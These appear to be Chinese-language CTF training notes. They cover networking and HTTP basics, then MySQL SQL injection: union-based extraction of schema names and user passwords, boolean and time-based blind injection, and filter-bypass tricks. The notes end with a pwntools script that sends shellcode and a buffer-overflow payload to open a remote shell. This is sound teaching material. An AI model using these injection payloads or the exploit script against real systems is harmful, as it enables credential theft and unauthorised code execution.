## Web

### IP

#### IPv4

- Internet Protocol version 4
- 由4个段组成，每个段 8 位，可以用任何表示 32 位整数的方式表示 IPv4 地址
    - 10.78.18.216 = 0xA4E12D8 = 172888792
    
    ![Untitled](web_1.png)
    

#### IPv6

- Internet Protocol version 6
- 由8个段组成，每个段16位
    - [**2001:da8:e000:731a:ff00:0:0:642d**](http://[2001:da8:e000:731a:ff00::642d]/)
    - **连续的全 0 段可以省略：2001:da8:e000:731a:ff00::642d**

### TCP/UDP

#### 背景

- OSI模型和TCP/IP模型
正如我们写代码层层封装，计算机网络的总体架构也是分层的。这样每个层各司其职，下层上上层的基础设施，逐渐构建复杂的功能。
    - OSI 七层模型
        
        ![Untitled](web_2.png)
        
    - TCP/IP 四层模型：广泛使用
    
    ![Untitled](web_3.png)
    

#### TCP

- **传输控制协议 Transmission Control Protocol：面向连接的协议**
- 通过复杂的握手、确认、重传等机制保证数据的顺序和可靠性

#### UDP

- **用户数据报协议User Datagram Protocol：无连接；"send and forget"**
- 更简单且快速；单向传输，不保证顺序，不保证可靠性

![Untitled](web_4.png)

#### 端口

- 软件层面的通信端点，与 IP 地址一起构成网络通信的基础端口号的范围是 0~65535
    - IP 地址识别机器，端口号识别软件（服务）
    - TCP 与 UDP 的端口号是分开的，即同一个端口号可以同时用于 TCP 和 UDP
    - 可以设置只监听（blind）某个 IP 地址的某个端口号
- 端口号的范围是 0~65535
    - **其中 0~1023 为系统保留端口，一般不用于通用服务**
- 一般情况下，不同的软件使用不同的端口号
    - 通过端口号可以区分不同的服务，例如 HTTP 的分配端口是 TCP 80
    - 即 [http://10.78.18.216](http://10.78.18.216/) 就是 [http://10.78.18.216:80](http://10.78.18.216/)
    - 否则需要写明端口号，如 [http://10.78.18.216:39200](http://10.78.18.216:39200/)

### 域名与DNS

- 域名Domain Name用于标识互联网上的计算机
    - 由一串用 . 分隔的字符串组成，例如 example.com
    - 最右侧的部分称为顶级域名(Top-Level Domain)：.com .net .org .cn 等
    - 从右至左依次为二级、三级域名等：www.example.com-
- 如何拥有一个域名？
    - 在域名注册商处购买，如阿里云、腾讯云、Cloudflare 等
    根据域名的 TLD、长度等因素，价格从几元到几千元不等（每年）
- 域名下面可以有任意多条 DNS 记录
    - DNS 服务商可以和域名注册商不同
    - 记录了如何处理对域名的请求，如 IP 地址、邮箱服务器等
    - 将域名映射到 IPv4 的记录称为 A 记录
    - 还有 AAAA（IPv6）、MX（邮箱）、CNAME（别名）、TXT（文本信息）等
    - 记录的 TTL（Time To Live）表示该记录的缓存时间
    
    ```bash
    $ nslookup -query=txt [45gfg9.net](http://45gfg9.net/)
    Server:     10.10.0.21
    Address:    10.10.0.21#53
    
    Non-authoritative answer:
    [45gfg9.net](http://45gfg9.net/)  text = "v=spf1 include:5943b80cxdpydy4.spf.skiff.com -all"
    [45gfg9.net](http://45gfg9.net/)  text = "oRAKQGGkRmqa26Gq40GEWu81UGBOoW3TjU8ACkgnp3+gGvKXhDlmCYScB80jfYu+Y+zY0Q3u125wHUcssCahxBnn+We9f7CXMEEHa1xIe825WAixRAeFmx65zuUf31AhVfafcUa3jlGpVx3gvKzwJdghXu5LaHADexzYpD12KCDEuXBCgvxmXYSMi40pfvjVDeZoYY8QG9sa/bjAljSULg=="
    ```
    

#### HTTP协议

- 超文本传输协议HyperText Transfer Protocol
- 是基于文本的协议，用于在客户端和服务器之间传输网页

```bash
GET / HTTP/1.1
Host: www.example.com
```

#### 架构

**客户端：你的浏览器**

- 可视化：图形、图片、布局…… HTML + CSS
- 人机交互逻辑：按钮点击，登录，发送请求……JS
- 缓存、Cookie
- 安全：不能将私密的、不该获取的信息传出去（比如 Cookie），不能为所欲为（比如注销其他网站的账号）

**服务端：某台或很多台服务器**

- 认证与鉴权：如何证明你是你
- Authentication
- Authorization
- 处理请求：用户需要做什么？将结果返回客户端
- 服务器也可以有不同分工：前端后端、数据库……
- 安全：用户不能获得不该获取的信息（比如 flag），不能为所欲为（比如任意代码执行）

#### URL：统一资源定位符

[https://slides.tonycrane.cc/PracticalSkillsTutorial/2023-fall-ckc/lec6/lec6/URI_syntax_diagram.svg.avif](https://slides.tonycrane.cc/PracticalSkillsTutorial/2023-fall-ckc/lec6/lec6/URI_syntax_diagram.svg.avif)

- URI（统一资源标识符）的一种，用于定位互联网上的资源

- 协议：https

- 主机：www.example.com

- 端口：443

- 路径：/path/to/resource

- 查询：query=1

- 片段：frag
- URL 中只能包含 ASCII 字符，由百分号编码定义的字符集
例如空格编码为 %20，或有些情况下编码为 +

#### 请求方法

- [HTTP 请求方法 - MDN Web Docs](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods)

```bash
nc httpbin.org 80

GET /get?hello=world HTTP/1.1
Host: httpbin.org
```

如同直接访问 http://httpbin.org/get?hello=world

- HTTP/1.x 请求的第一行由请求方法、路径和协议版本组成
    - GET：最常用，用于获取资源，不能有请求体
    - POST：用于提交数据
    - PUT 更新资源；DELETE 删除资源；HEAD 获取资源的头部信息；等等
    - 如何解释请求方法由服务器决定，不同的服务器可能有不同的实现

#### 标头，请求体，响应体

```bash
POST /post HTTP/1.1
Host: httpbin.org
Content-Length: 12
Connection: close

hello server
```

- [**HTTP 标头 - MDN Web Docs**](https://developer.mozilla.org/zh-CN/docs/web/http/headers)
- 标头（Header）是由键值对组成的文本，用于描述请求或响应的属性
    - 以冒号分隔键和值，以换行符分隔不同的键值对
    - 以空行分隔标头和正文（请求体 / 响应体）
    - 不同标头有不同的含义，如 Content-Length（正文的长度）
- 可以在浏览器的开发者工具中查看所有的 HTTP 请求及其所有内容

#### More

- nc 直接操作TCP流，不会自动处理HTTP协议，所以需要手动输入内容
    - 有更方便的命令行工具：curl、wget等
    - 也可以用浏览器自带的开发者工具

```bash
## 默认进行 GET 请求
curl "http://httpbin.org/get?hello=world"

## -i 显示响应头
curl -i http://10.78.18.216:39200

## -v 显示详细信息，-X 指定请求方法，-d 指定请求体
curl -v -X POST http://httpbin.org/post -d 'hello server'

```

### SQL注入

#### MySQL基础
- mysql -u root -p 使用密码登录
- SHOW DATABASES;
- USE db_name;
- SHOW TABLES;
- SHOW COLUMNS FROM table_name;

##### SELECT
```sql
SELECT field1, field2,...fieldN (FROM table_name1, table_name2... 
[WHERE condition1 [AND [OR]] condition2...)
```

Examples:
```
SELECT SLEEP(2);
SELECT 1, DATABASE(), VERSION(), USER(), ASCII('A'), CONCAT('A','B');
```

---

```sql
SELECT col_name FROM table_name /*从特定表中获取特定列*/
SELECT * FROM table_name /*从特定表中获取全部列*/
SELECT * FROM table_name WHERE col_name = XXX /*在限定条件下取数据*/ 
SELECT * FROM table_name ORDER BY col_name(col_index) /*根据列名或索引排序*/
SELECT col_name1, col_name2… FROM table_name LIMIT N, M  /*从第N(从0开始)条开始返回M条数据*/
SELECT col_name1, col_name2… FROM table_name LIMIT M OFFSET N  /*也可以这么写*/
SELECT concat(col_name1, col_name2…) FROM table_name /*整合列数据*/
SELECT group_concat(col_name1, col_name2…) FROM table_name /*整合行、列数据*/
```
##### 注释

```
/*
这是注释，支持多行
*/
-- 这也是注释
## 这还是注释
```
##### 其他

- 一些常用的URL编码:  
Space: %20  
\#: 	%23  
':	%27  
":	%22  
+:	%2B  
`#+$-_.!*()` 浏览器地址栏默认不编码，但是不意味着不能编码

#### 注入技巧

##### 判断为数字型还是字符型

```sql
传入id=2-1
如果是数字型，语句应该变为：
SELECT col_name(…) FROM table_name WHERE id = 2-1 
等价于：
SELECT col_name(…) FROM table_name WHERE id = 1 
那么就应该能正常返回id=1的页面！
而如果是字符型，语句应该变为：
SELECT col_name(…) FROM table_name WHERE id = '2-1'
会因为查询不到内容
```

##### 联合查询

```sql
SELECT field1, …, fieldN FROM table_name UNION SELECT field1*, …, fieldN* FROM table_name*;
SELECT col_name1, …, col_nameN FROM table_name WHERE id = 3 UNION SELECT DATABASE(), USER(),  
```
但利用联合查询前需要保证前后列数相同，我们也需要判断原sql查询的列数
我们可以尝试构造
```sql
SELECT col_name1, …, col_name FROM table_name WHERE id = 1 ORDER BY M;
```

M<=N时，能有正常的返回
M>N时会报错
从而可以判断查询的列数！

当然，一个个试也可以
```sql
SELECT col_name1, …, col_name FROM table_name WHERE id = 1 UNION SELECT 1, 2, …;
```

在MySQL中，所有的数据库名存放在information_schema.schemata的schema_name字段下
```sql
SELECT schema_name FROM information_schema.schemata;

所有的表名存放在information_schema.tables的table_name字段下，可以以table_schema为条件筛选
SELECT table_name FROM information_schema.tables WHERE table_schema='db_name';

所有的列名存放在information_schema.columns的column_name字段下，可以以table_schema和table_name为条件筛选
SELECT column_name FROM information_schema.columns WHERE table_name='table_name' AND table_schema='db_name';

可以构造
SELECT col_name1, …, col_nameN FROM table_name WHERE id = 3 UNION SELECT group_concat(schema_name), 2, 3 FROM information_schema.schemata;
获取所有数据库信息，以此类推

获取到表、列名后，可以获取其他数据。这里以users表中的passwd字段为例
SELECT col_name1, …, col_nameN FROM table_name WHERE id = 3 UNION SELECT group_concat(passwd), 2, 3 FROM users;
如果想要分行获取，也可以借助LIMIT
SELECT col_name1, …, col_nameN FROM table_name WHERE id = 3 UNION SELECT passwd, 2, 3 FROM users LIMIT 0, 1;

```

##### 无回显的注入

- 提取字符进行判断
```sql
例如传入uname=a' or ASCII(SUBSTR(DATABASE(), 1, 1))>0#
SQL语句变为
SELECT col_name(…) FROM table_name WHERE username = 'a' or ASCII(SUBSTR(DATABASE(), 1, 1))>0#'
返回User Found，说明DATABASE()的第一位的ASCII码>0
多次重复即可得到数据

也可以查找其他表的数据
SELECT col_name(…) FROM table_name WHERE username = 'a' or ASCII(SUBSTR((SELECT GROUP_CONCAT(passwd) FROM users), 1, 1))>0#'
道理是一样的
```
- 利用延时
```sql
IF(condition, expr1, expr2)
如果condition为真就执行expr1，反之执行expr2

和SLEEP()配合，就能通过测量响应时间来获取数据！

SELECT col_name(…) FROM table_name WHERE username = 'admin' and IF(ASCII(SUBSTR(DATABASE(), 1, 1))>0, SLEEP(0), SLEEP(2))#'

如果延时超过2秒，说明条件为假，反之为真
```
##### 绕过

针对关键字/正则匹配

1. 大小写
2. 利用等价命令 比如 OR->||, SPACE->/**/, ORDER BY->GROUP BY …
3. 如果只是单纯删去关键字，且只删一次，可以嵌套绕过，比如UNION是关键字会被删除，那么传入UNUNIONION就会被删成UNION，从而注入

针对语义匹配
相对难度较大，只能利用语言特性把语义检测绕晕。常见办法是嵌套注释符让其以为全部内容都被注释了。

奇技淫巧：
1. 超长字符串绕过
2. 多次编码(需要服务端有相应解码功能)
3. %00截断/换行截断
4. 改变请求方式 GET->POST, ?a=1 -> /a/1

##### Python相关

- 利用requests库来发送请求
```python
import requests
url = 'https://www.zju.edu.cn'
sess = requests.session()
r = sess.get(url)
headers = {
    'Cookies':'...'
}
data = {
    "...":"..."
}
r = sess.post(url,headers=headers,data=data)
```

- 利用pwntools中的**remote**来与远程服务器交互，发送一些**不可见字符**等
```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'

p = remote('127.0.0.1', int(input()))

sc = b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

pause()

p.sendafter("what's your name:",sc)

address = 0x20000+0x1000*int(input())

length = 0x48

payload = length*b"A"+p64(address)

p.sendafter("try to overflow me~",payload)

p.interactive()
```
